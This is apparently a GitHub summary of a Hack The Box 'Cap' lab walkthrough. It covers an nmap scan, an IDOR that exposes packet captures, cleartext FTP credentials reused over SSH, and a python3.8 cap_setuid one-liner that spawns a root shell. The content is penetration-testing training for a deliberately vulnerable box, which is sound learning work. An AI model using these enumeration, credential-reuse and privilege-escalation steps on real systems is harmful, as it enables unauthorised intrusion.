# 🛡️ Hack The Box — CAP (Guided Mode Walkthrough) 

**Difficulty**: Easy  
**Category**: Linux, Web  
**Tools Used**: Nmap, FTP, Wireshark, Python, SSH  
**CEH Domains**: Reconnaissance, Scanning, Gaining Access, Maintaining Access, Privilege Escalation  

---

## ⚔️ Phase 1: Reconnaissance

**Goal**: Identify open ports, services, and basic information about the target.

We begin with a simple Nmap scan to discover what’s exposed:

```bash
nmap -sC -sV -v -oN cap-initial.txt 10.10.10.245
```

**Explanation:**
- `-sC` : Run default scripts
- `-sV` : Detect service versions
- `-v` : Verbose output
- `-oN` : Save output to file

**Nmap Results:**
- **FTP (21)** — vsftpd 3.0.3
- **SSH (22)** — OpenSSH 8.2p1
- **HTTP (80)** — Gunicorn server hosting a "Security Dashboard"

---

## 🔍 Phase 2: Scanning & Enumeration

Browsing to `http://10.10.10.245`, we discover a web app that captures "5-second PCAPs" and stores them at `/data/{id}`.

By manually visiting `/data/0`, `/data/1`, etc., we can view historical captures — this is a classic **IDOR vulnerability** (Insecure Direct Object Reference).

Each capture has a **Download** button. We download one of the PCAP files and inspect it.

---

## 📡 Phase 3: Gaining Access

Open the `.pcap` in Wireshark:

```bash
wireshark 0.pcap
```

Apply the filter:
```bash
ftp
```

Within the capture, we discover cleartext FTP credentials:
```
Username: nathan
Password: <REDACTED>
```

Try logging in via FTP:
```bash
ftp 10.10.10.245
```

Success! We can access Nathan’s home directory and see `user.txt`, but we can't upload or execute. So we try:

```bash
ssh nathan@10.10.10.245
```

Using the same credentials: **We're in!**

---

## 🎩 Phase 4: Privilege Escalation

Now with a full shell, we begin enumerating the system.

Check sudo rights:
```bash
sudo -l
```
> User nathan may not run sudo.

Check for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```
> Nothing unusual

Check for Linux capabilities:
```bash
getcap -r / 2>/dev/null
```

**Key Finding:**
```
/usr/bin/python3.8 = cap_setuid+ep
```

This means Python can set its user ID to 0 — aka root — without being SUID or needing sudo.

### 🔓 Exploitation:
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Confirm:
```bash
whoami && id
```
> You are now root.

---

## ✅ Summary

| CEH Phase            | Technique                        | Tool(s) Used     |
|----------------------|-----------------------------------|------------------|
| Reconnaissance        | Port scan                        | nmap             |
| Scanning & Enum       | IDOR discovery                   | browser, dir brute|
| Gaining Access        | FTP creds via PCAP               | Wireshark, FTP   |
| Maintaining Access    | SSH shell                        | OpenSSH          |
| Privilege Escalation  | cap_setuid+ep on python3.8       | getcap, Python   |

---

## 🧵 Next Steps

This is the GitHub summary version. For a full beginner-focused breakdown with visuals, tips, CEH exam insights, and commentary—check out the full writeup on [Alien37.com](https://www.alien37.com/posts/htb-cap-walkthrough) _(coming soon)_

---

*Walkthrough by [Alien37](https://github.com/a1i3n37x) — Stay curious. Stay sharp.*

